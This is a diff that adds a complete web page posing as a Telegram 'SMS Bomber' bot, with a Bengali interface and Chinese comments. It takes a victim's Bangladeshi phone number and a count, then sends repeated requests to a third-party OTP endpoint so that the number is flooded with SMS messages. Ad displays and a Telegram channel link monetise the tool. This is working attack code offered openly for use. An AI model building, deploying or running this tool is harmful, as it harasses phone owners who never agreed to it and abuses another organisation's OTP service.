@@ -1,1 +1,628 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>💣 SMS Bomber · Pro</title>
+  <!-- Ad SDK (必须放在head内) -->
+  <script src="//libtl.com/sdk.js" data-zone="10821709" data-sdk="show_10821709"></script>
+  <!-- Telegram Web App SDK (自动检测) -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', 'Roboto', system-ui, sans-serif;
+      background: #e7ebf0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 8px;
+    }
+    .phone-frame {
+      max-width: 480px;
+      width: 100%;
+      height: 780px;
+      background: #ffffff;
+      border-radius: 28px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.12), 0 6px 12px rgba(0,0,0,0.05);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      border: 1px solid rgba(0,0,0,0.05);
+    }
+    .chat-header {
+      background: #2a9d8f;
+      color: white;
+      padding: 16px 18px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-bottom: 1px solid #21867a;
+    }
+    .back-btn {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: background 0.2s;
+    }
+    .back-btn:hover { background: rgba(255,255,255,0.15); }
+    .chat-header h2 { font-size: 1.4rem; font-weight: 600; flex: 1; }
+    .header-status { font-size: 13px; opacity: 0.9; display: flex; align-items: center; gap: 4px; }
+    .chat-messages {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px 12px;
+      background: #f8fafc;
+      background-image: radial-gradient(circle at 20% 30%, rgba(220, 240, 245, 0.3) 0%, transparent 30%);
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .message-row { display: flex; width: 100%; }
+    .message-bot { justify-content: flex-start; }
+    .message-user { justify-content: flex-end; }
+    .bubble {
+      max-width: 85%;
+      padding: 12px 16px;
+      border-radius: 20px;
+      font-size: 15px;
+      line-height: 1.5;
+      word-break: break-word;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.03);
+    }
+    .bot-bubble { background: white; border: 1px solid #e4e9f0; border-top-left-radius: 6px; color: #1e2a3a; }
+    .user-bubble { background: #2a9d8f; color: white; border-top-right-radius: 6px; }
+    .inline-keyboard { margin-top: 8px; display: flex; flex-wrap: wrap; gap: 6px; }
+    .inline-btn {
+      background: #edf2f7;
+      border: 1px solid #d0dae8;
+      padding: 8px 16px;
+      border-radius: 40px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #1e2a3a;
+      cursor: pointer;
+      transition: all 0.15s;
+      text-decoration: none;
+    }
+    .inline-btn:hover { background: #e2e8f0; }
+    .chat-footer { background: white; border-top: 1px solid #e2e8f0; padding: 12px 16px; }
+    .reply-keyboard { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 12px; }
+    .keyboard-btn {
+      background: #f1f5f9;
+      border: 1px solid #cbd5e1;
+      padding: 10px 18px;
+      border-radius: 40px;
+      font-size: 15px;
+      font-weight: 500;
+      color: #0f172a;
+      cursor: pointer;
+      transition: all 0.15s;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+      flex: 0 1 auto;
+    }
+    .keyboard-btn:hover { background: #e6edf5; border-color: #2a9d8f; }
+    .input-container { display: flex; align-items: center; gap: 10px; }
+    .input-container input {
+      flex: 1;
+      padding: 14px 18px;
+      border: 1.5px solid #dee6ed;
+      border-radius: 40px;
+      font-size: 15px;
+      outline: none;
+      transition: border 0.2s;
+      background: #fafbfc;
+    }
+    .input-container input:focus { border-color: #2a9d8f; background: white; }
+    .input-container input::placeholder { color: #8a99aa; font-size: 14px; }
+    .send-btn {
+      background: #2a9d8f;
+      color: white;
+      border: none;
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 20px;
+      box-shadow: 0 4px 8px rgba(42,157,143,0.2);
+    }
+    .send-btn:hover { background: #238b7e; }
+    .typing-indicator { display: flex; align-items: center; gap: 4px; padding: 8px 0; }
+    .dot { width: 8px; height: 8px; background: #94a3b8; border-radius: 50%; animation: bounce 1.2s infinite ease-in-out; }
+    .dot:nth-child(2) { animation-delay: 0.2s; }
+    .dot:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes bounce { 0%,60%,100% { transform: translateY(0); } 30% { transform: translateY(-10px); } }
+    .small-note { color: #64748b; font-size: 12px; margin-top: 6px; text-align: center; }
+    code { background: #f1f5f9; padding: 2px 6px; border-radius: 8px; }
+  </style>
+</head>
+<body>
+<div class="phone-frame">
+  <div class="chat-header">
+    <div class="back-btn" id="resetChatBtn" title="মেনুতে ফিরুন"><i class="fas fa-chevron-left"></i></div>
+    <h2>💣 SMS Bomber</h2>
+    <div class="header-status"><i class="fas fa-circle" style="font-size: 8px; color: #b9f5e8;"></i><span>অনলাইন</span></div>
+  </div>
+  <div class="chat-messages" id="chatMessages"></div>
+  <div class="chat-footer">
+    <div class="reply-keyboard" id="replyKeyboard"></div>
+    <div class="input-container">
+      <input type="text" id="messageInput" placeholder="বার্তা লিখুন..." autocomplete="off" enterkeyhint="send">
+      <button class="send-btn" id="sendBtn"><i class="fas fa-paper-plane"></i></button>
+    </div>
+    <div class="small-note" id="placeholderHint"></div>
+  </div>
+</div>
 
+<script>
+  (function(){
+    "use strict";
+
+    // ---------- 常量 ----------
+    const DAILY_SMS_LIMIT = 20;
+    const MAIN_KEYBOARD = [
+      [{ text: '💣 SMS Bomber' }],
+      [{ text: '👤 Profile' }, { text: '❓ Help' }],
+      [{ text: 'Join Telegram' }]   // 移除了 Offers 按钮
+    ];
+
+    // ---------- 全局变量 ----------
+    const chatEl = document.getElementById('chatMessages');
+    const inputEl = document.getElementById('messageInput');
+    const sendBtn = document.getElementById('sendBtn');
+    const keyboardDiv = document.getElementById('replyKeyboard');
+    const hintEl = document.getElementById('placeholderHint');
+
+    let currentStep = 'main';           // 'main', 'get_phone', 'get_amount'
+    let bomberPhone = '';
+    let isTyping = false;
+    let messages = [];                 // 聊天记录数组 {type, text, replyMarkup, parseMode}
+    let adTimer = null;
+
+    // 用户资料 (Telegram自动检测)
+    let userProfile = {
+      telegram_id: 'web_' + Math.random().toString(36).substr(2, 9),
+      first_name: 'অতিথি',
+      last_name: '',
+      username: 'web_guest',
+      joined_at: new Date().toISOString().slice(0,19).replace('T',' ')
+    };
+
+    // ---------- 本地存储: 聊天记录 & 每日限额 & 用户资料 ----------
+    function loadMessagesFromStorage() {
+      const saved = localStorage.getItem('smsbomber_messages');
+      if(saved) {
+        try { messages = JSON.parse(saved); } catch(e){ messages = []; }
+      }
+    }
+    function saveMessagesToStorage() {
+      localStorage.setItem('smsbomber_messages', JSON.stringify(messages));
+    }
+
+    // 每日限额管理
+    function getTodayKey() {
+      return new Date().toISOString().slice(0,10); // YYYY-MM-DD
+    }
+    function getDailyCount() {
+      const key = getTodayKey();
+      const data = localStorage.getItem('sms_daily_usage');
+      if(data) {
+        try {
+          const usage = JSON.parse(data);
+          return usage[key] || 0;
+        } catch(e){ return 0; }
+      }
+      return 0;
+    }
+    function incrementDailyCount(amount = 1) {
+      const key = getTodayKey();
+      let usage = {};
+      const stored = localStorage.getItem('sms_daily_usage');
+      if(stored) { try { usage = JSON.parse(stored); } catch(e){} }
+      usage[key] = (usage[key] || 0) + amount;
+      localStorage.setItem('sms_daily_usage', JSON.stringify(usage));
+    }
+    function getRemainingDaily() {
+      return Math.max(0, DAILY_SMS_LIMIT - getDailyCount());
+    }
+
+    // 用户资料存储
+    function loadUserProfile() {
+      const saved = localStorage.getItem('smsbomber_profile');
+      if(saved) {
+        try { userProfile = { ...userProfile, ...JSON.parse(saved) }; } catch(e){}
+      }
+      saveUserProfile();
+    }
+    function saveUserProfile() {
+      localStorage.setItem('smsbomber_profile', JSON.stringify(userProfile));
+    }
+    function registerUserIfNeeded() {
+      if(!localStorage.getItem('smsbomber_registered')) {
+        userProfile.joined_at = new Date().toISOString().slice(0,19).replace('T',' ');
+        saveUserProfile();
+        localStorage.setItem('smsbomber_registered', '1');
+        return true;
+      }
+      return false;
+    }
+
+    // ---------- Telegram 自动检测 ----------
+    if (window.Telegram && window.Telegram.WebApp) {
+      const tg = window.Telegram.WebApp;
+      tg.ready();
+      const initData = tg.initDataUnsafe;
+      if (initData && initData.user) {
+        const u = initData.user;
+        userProfile.telegram_id = String(u.id);
+        userProfile.first_name = u.first_name || userProfile.first_name;
+        userProfile.last_name = u.last_name || '';
+        userProfile.username = u.username || (u.id ? 'tg'+u.id : 'web_guest');
+        saveUserProfile();
+      }
+    }
+
+    // ---------- 广告集成 (每30秒插屏) ----------
+    function showAdIfPossible() {
+      if (typeof show_10821709 === 'function') {
+        show_10821709().catch(e => console.log('广告展示失败:', e));
+      }
+    }
+
+    function startAdInterval() {
+      if (adTimer) clearInterval(adTimer);
+      adTimer = setInterval(() => {
+        showAdIfPossible();
+      }, 30000); // 30秒
+    }
+
+    // 激励广告 (用于轰炸前)
+    function showRewardedAd() {
+      return new Promise((resolve) => {
+        if (typeof show_10821709 !== 'function') {
+          resolve();
+          return;
+        }
+        show_10821709('pop').then(() => {
+          resolve();
+        }).catch(() => {
+          resolve(); // 即使出错也继续
+        });
+      });
+    }
+
+    // ---------- UI 渲染 ----------
+    function scrollToBottom() { chatEl.scrollTop = chatEl.scrollHeight; }
+
+    function renderMessages() {
+      chatEl.innerHTML = '';
+      messages.forEach(msg => {
+        if (msg.type === 'bot') {
+          addBotMessageToDOM(msg.text, msg.replyMarkup, msg.parseMode);
+        } else {
+          addUserMessageToDOM(msg.text);
+        }
+      });
+      scrollToBottom();
+    }
+
+    function addBotMessageToDOM(text, replyMarkup, parseMode) {
+      const row = document.createElement('div');
+      row.className = 'message-row message-bot';
+      let formatted = text;
+      if (parseMode === 'Markdown') {
+        formatted = text.replace(/\*(.*?)\*/g, '<strong>$1</strong>').replace(/`(.*?)`/g, '<code>$1</code>');
+      }
+      const bubble = document.createElement('div');
+      bubble.className = 'bubble bot-bubble';
+      bubble.innerHTML = formatted.replace(/\n/g, '<br>');
+      if (replyMarkup && replyMarkup.inline_keyboard) {
+        const mk = document.createElement('div');
+        mk.className = 'inline-keyboard';
+        replyMarkup.inline_keyboard.forEach(row => {
+          row.forEach(btn => {
+            const btnEl = document.createElement('span');
+            btnEl.className = 'inline-btn';
+            btnEl.textContent = btn.text;
+            if (btn.url) {
+              btnEl.addEventListener('click', (e) => { e.stopPropagation(); window.open(btn.url, '_blank'); });
+            }
+            mk.appendChild(btnEl);
+          });
+        });
+        bubble.appendChild(mk);
+      }
+      row.appendChild(bubble);
+      chatEl.appendChild(row);
+    }
+
+    function addUserMessageToDOM(text) {
+      const row = document.createElement('div');
+      row.className = 'message-row message-user';
+      const bubble = document.createElement('div');
+      bubble.className = 'bubble user-bubble';
+      bubble.textContent = text;
+      row.appendChild(bubble);
+      chatEl.appendChild(row);
+    }
+
+    function addBotMessage(text, replyMarkup = null, parseMode = null) {
+      messages.push({ type: 'bot', text, replyMarkup, parseMode });
+      addBotMessageToDOM(text, replyMarkup, parseMode);
+      saveMessagesToStorage();
+      scrollToBottom();
+    }
+
+    function addUserMessage(text) {
+      messages.push({ type: 'user', text });
+      addUserMessageToDOM(text);
+      saveMessagesToStorage();
+      scrollToBottom();
+    }
+
+    function renderReplyKeyboard(keyboard) {
+      keyboardDiv.innerHTML = '';
+      if (!keyboard) return;
+      keyboard.forEach(row => {
+        row.forEach(btn => {
+          const b = document.createElement('button');
+          b.className = 'keyboard-btn';
+          b.textContent = btn.text;
+          b.addEventListener('click', () => handleButtonClick(btn.text));
+          keyboardDiv.appendChild(b);
+        });
+      });
+    }
+
+    function setInputPlaceholder(text) {
+      inputEl.placeholder = text || 'বার্তা লিখুন...';
+      hintEl.textContent = text || '';
+    }
+
+    function showTyping() {
+      if (isTyping) return null;
+      isTyping = true;
+      const id = 'typing-' + Date.now();
+      const div = document.createElement('div');
+      div.id = id;
+      div.className = 'message-row message-bot';
+      div.innerHTML = `<div class="bubble bot-bubble typing-indicator"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>`;
+      chatEl.appendChild(div);
+      scrollToBottom();
+      return id;
+    }
+    function hideTyping(id) { if(id) document.getElementById(id)?.remove(); isTyping = false; }
+
+    // ---------- 按钮动作 (所有按钮重定向后工作正常) ----------
+    function handleButtonClick(btnText) {
+      if (btnText === '💣 SMS Bomber') startSmsBomber();
+      else if (btnText === '👤 Profile') showProfile();
+      else if (btnText === '❓ Help') showHelp();
+      else if (btnText === 'Join Telegram') joinTelegram();
+      else {
+        addUserMessage(btnText);
+        processUserInput(btnText);
+      }
+    }
+
+    function processUserInput(text) {
+      if (currentStep === 'get_phone') validateAndSavePhone(text);
+      else if (currentStep === 'get_amount') validateAndStartBombing(text);
+      else {
+        if (text === '/start') showStartMessage(false);
+        else {
+          addBotMessage('দুঃখিত, আমি বুঝতে পারিনি। নিচের বাটন ব্যবহার করুন।');
+          renderReplyKeyboard(MAIN_KEYBOARD);
+        }
+      }
+    }
+
+    // ---------- 核心功能 ----------
+    function showStartMessage(isReturning = true) {
+      const name = userProfile.first_name;
+      const msg = isReturning ? `স্বাগতম, ${name}! আপনি প্রধান মেনুতে আছেন!` : `স্বাগতম, ${name}! আপনি সফলভাবে নিবন্ধিত হয়েছেন!`;
+      addBotMessage(msg);
+      renderReplyKeyboard(MAIN_KEYBOARD);
+      currentStep = 'main';
+      setInputPlaceholder('একটি অপশন বাছাই করুন');
+    }
+
+    function startSmsBomber() {
+      addUserMessage('💣 SMS Bomber');
+      const remaining = getRemainingDaily();
+      if (remaining <= 0) {
+        addBotMessage(`❌ আজকের সীমা (${DAILY_SMS_LIMIT} SMS) শেষ হয়ে গেছে। আগামীকাল আবার চেষ্টা করুন।`);
+        renderReplyKeyboard(MAIN_KEYBOARD);
+        currentStep = 'main';
+        return;
+      }
+      addBotMessage(`📱 আজকে আরও ${remaining} টি SMS পাঠাতে পারবেন।\nঅনুগ্রহ করে টার্গেট ফোন নম্বরটি লিখুন (যেমন: 01712345678):`);
+      currentStep = 'get_phone';
+      renderReplyKeyboard([]);
+      setInputPlaceholder('ফোন নম্বর (01XXXXXXXXX)');
+      inputEl.focus();
+    }
+
+    function validateAndSavePhone(phone) {
+      addUserMessage(phone);
+      const regex = /^01[3-9]\d{8}$/;
+      if (regex.test(phone)) {
+        bomberPhone = phone;
+        addBotMessage(`✅ নম্বর: ${phone} সংরক্ষিত। এখন SMS সংখ্যা লিখুন (সর্বোচ্চ ${getRemainingDaily()}):`);
+        currentStep = 'get_amount';
+        setInputPlaceholder(`সংখ্যা (1-${getRemainingDaily()})`);
+      } else {
+        addBotMessage('❌ ভুল নম্বর! সঠিক বাংলাদেশী নম্বর লিখুন (01XXXXXXXXX):');
+        setInputPlaceholder('সঠিক নম্বর লিখুন');
+      }
+      inputEl.value = '';
+    }
+
+    async function validateAndStartBombing(amountStr) {
+      const amount = parseInt(amountStr, 10);
+      addUserMessage(amountStr);
+      const remaining = getRemainingDaily();
+      
+      if (isNaN(amount) || amount < 1) {
+        addBotMessage('❌ ভুল সংখ্যা! অন্তত ১ বার লিখুন:');
+        setInputPlaceholder(`সংখ্যা (1-${remaining})`);
+        inputEl.value = '';
+        return;
+      }
+      if (amount > remaining) {
+        addBotMessage(`❌ আজকের বাকি সীমা ${remaining} টি SMS। অনুগ্রহ করে ${remaining} বা তার কম লিখুন:`);
+        setInputPlaceholder(`সংখ্যা (1-${remaining})`);
+        inputEl.value = '';
+        return;
+      }
+      if (!bomberPhone) {
+        addBotMessage('ফোন নম্বর খুঁজে পাওয়া যায়নি। আবার চেষ্টা করুন।');
+        renderReplyKeyboard(MAIN_KEYBOARD);
+        currentStep = 'main';
+        return;
+      }
+
+      // 展示激励广告
+      addBotMessage('⏳ বিজ্ঞাপন দেখুন, তারপর SMS পাঠানো শুরু হবে...');
+      await showRewardedAd();
+
+      currentStep = 'main';
+      renderReplyKeyboard(MAIN_KEYBOARD);
+      setInputPlaceholder('বার্তা লিখুন...');
+
+      addBotMessage(`🚀 SMS পাঠানো শুরু হচ্ছে ${bomberPhone} নম্বরে ${amount} বার।`);
+      
+      // 执行轰炸 (模拟API)
+      const typingId = showTyping();
+      const promises = [];
+      for (let i = 0; i < amount; i++) {
+        const p = fetch(`https://api.karigoripathsala.com/api/get-otp?phone=${bomberPhone}`)
+          .then(res => res.ok ? res.json() : Promise.reject())
+          .catch(() => ({ mock: true }));
+        promises.push(p);
+        await new Promise(r => setTimeout(r, 300));
+      }
+      await Promise.allSettled(promises);
+      hideTyping(typingId);
+
+      // 增加每日计数
+      incrementDailyCount(amount);
+      
+      addBotMessage(`✅ সম্পন্ন! ${amount}টি SMS পাঠানোর চেষ্টা সম্পন্ন হয়েছে। আজকের বাকি: ${getRemainingDaily()}`);
+      bomberPhone = '';
+      inputEl.value = '';
+    }
+
+    function showProfile() {
+      addUserMessage('👤 Profile');
+      const p = userProfile;
+      const msg = `👤 *আপনার প্রোফাইল*\n\n▪️ *নাম*: ${p.first_name} ${p.last_name}\n▪️ *ইউজারনেম*: @${p.username}\n▪️ *Telegram ID*: \`${p.telegram_id}\`\n▪️ *যোগদান*: ${p.joined_at}`;
+      addBotMessage(msg, null, 'Markdown');
+      renderReplyKeyboard(MAIN_KEYBOARD);
+      currentStep = 'main';
+    }
+
+    function showHelp() {
+      addUserMessage('❓ Help');
+      addBotMessage(`*সহায়তা*\n\n▪️ /start - শুরু\n▪️ 💣 SMS Bomber - OTP বোম্বিং (দৈনিক সর্বোচ্চ ${DAILY_SMS_LIMIT})\n▪️ 👤 Profile - তথ্য\n▪️ Join Telegram - চ্যানেল`, null, 'Markdown');
+      renderReplyKeyboard(MAIN_KEYBOARD);
+      currentStep = 'main';
+    }
+
+    function joinTelegram() {
+      addUserMessage('Join Telegram');
+      addBotMessage('আমাদের টেলিগ্রাম চ্যানেলে যুক্ত হোন:', {
+        inline_keyboard: [[{ text: '📢 bdtoools', url: 'https://t.me/bdtoools' }]]
+      });
+      renderReplyKeyboard(MAIN_KEYBOARD);
+      currentStep = 'main';
+    }
+
+    function handleSend() {
+      const text = inputEl.value.trim();
+      if (!text) return;
+      if (currentStep === 'get_phone' || currentStep === 'get_amount') {
+        processUserInput(text);
+      } else {
+        addUserMessage(text);
+        if (text === '/start') showStartMessage(false);
+        else if (text === '/help') showHelp();
+        else if (text === '/profile') showProfile();
+        else {
+          addBotMessage('দুঃখিত, বুঝতে পারিনি। নিচের বাটন ব্যবহার করুন।');
+          renderReplyKeyboard(MAIN_KEYBOARD);
+        }
+      }
+      inputEl.value = '';
+    }
+
+    function resetToMain() {
+      currentStep = 'main';
+      bomberPhone = '';
+      renderReplyKeyboard(MAIN_KEYBOARD);
+      setInputPlaceholder('একটি অপশন বাছাই করুন');
+      addBotMessage('🔙 প্রধান মেনুতে ফিরে এসেছেন।');
+    }
+
+    // ---------- 初始化 ----------
+    function init() {
+      loadUserProfile();
+      registerUserIfNeeded();
+      loadMessagesFromStorage();
+      
+      // 如果没有任何消息，显示欢迎语
+      if (messages.length === 0) {
+        const isNew = !localStorage.getItem('smsbomber_registered');
+        const name = userProfile.first_name;
+        if (isNew) {
+          addBotMessage(`স্বাগতম, ${name}! আপনি সফলভাবে নিবন্ধিত হয়েছেন!`);
+        } else {
+          addBotMessage(`স্বাগতম, ${name}! আপনি প্রধান মেনুতে আছেন!`);
+        }
+        renderReplyKeyboard(MAIN_KEYBOARD);
+      } else {
+        // 渲染历史记录
+        renderMessages();
+        // 确保键盘显示
+        renderReplyKeyboard(MAIN_KEYBOARD);
+      }
+
+      currentStep = 'main';
+      setInputPlaceholder('একটি অপশন বাছাই করুন');
+
+      // 启动30秒广告定时器
+      startAdInterval();
+
+      // 可选: 首次名字询问
+      if (!localStorage.getItem('name_asked')) {
+        const n = prompt('আপনার নাম লিখুন:', 'অতিথি');
+        if (n && n.trim()) { userProfile.first_name = n.trim(); saveUserProfile(); }
+        localStorage.setItem('name_asked', '1');
+      }
+    }
+
+    // 事件绑定
+    sendBtn.addEventListener('click', handleSend);
+    inputEl.addEventListener('keypress', (e) => { if(e.key==='Enter') { e.preventDefault(); handleSend(); } });
+    document.getElementById('resetChatBtn').addEventListener('click', resetToMain);
+
+    init();
+  })();
+</script>
+</body>
+</html>
